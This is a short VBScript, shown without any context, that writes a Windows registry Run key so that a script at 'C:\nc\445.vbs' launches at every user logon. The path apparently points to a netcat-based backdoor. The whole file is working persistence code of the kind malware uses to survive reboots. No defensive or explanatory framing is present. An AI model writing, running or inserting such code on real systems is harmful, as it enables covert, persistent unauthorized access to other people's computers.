Dim WSHShell
Set WSHShell=Wscript.CreateObject("Wscript.Shell")
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" ,"C:\nc\445.vbs","REG_SZ"
